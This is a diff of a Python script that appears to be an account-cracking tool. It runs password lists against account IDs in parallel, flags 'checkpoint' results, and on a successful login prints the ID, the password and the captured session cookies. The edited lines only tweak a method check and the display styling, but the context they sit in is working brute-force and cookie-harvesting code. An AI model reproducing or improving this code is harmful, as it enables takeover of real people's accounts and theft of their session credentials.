@@ -1402,7 +1402,7 @@ def passwrd():
 						pwv.append(xpwd)
 				else:pass
 					
-				if '' in method:
+				if 'reguler' in method:
 					pool.submit(reguler,idf,pwv,awal)
 				else:
 					pool.submit(reguler,idf,pwv,awal)
@@ -1459,7 +1459,7 @@ def reguler(idf,pwv,awal):
 			if "checkpoint" in ses.cookies.get_dict().keys():
 				cp+=1
 				tree = Tree(Panel.fit(f"""{K2}{idf}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
-				tree.add(Panel.fit(f"{K2}{cektahun(idf)}{P2}",style=f"{color_panel}",guide_style="bold grey100"))
+				tree.add(Panel.fit(f"{K2}{cektahun(idf)}{P2}",style=f"{color_panel}"))
 				tree.add(Panel(f"{K2}{ua}{P2}",style=f"{color_panel}"))
 				prints(tree)
 				os.popen('play-audio c.mp3')
@@ -1471,7 +1471,7 @@ def reguler(idf,pwv,awal):
 				ok+=1
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				tree = Tree(Panel.fit(f"""{H2}{idf}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
-				tree.add(Panel(f"{H2}{cektahun(idf)}{P2}",style=f"{color_panel}",guide_style="bold grey100"))
+				tree.add(Panel(f"{H2}{cektahun(idf)}{P2}",style=f"{color_panel}"))
 				tree.add(Panel(f"{H2}{ua}{P2}",style=f"{color_panel}"))
 				tree.add(Panel(f"{H2}{kuki}{P2}",style=f"{color_panel}"))
 				prints(tree)
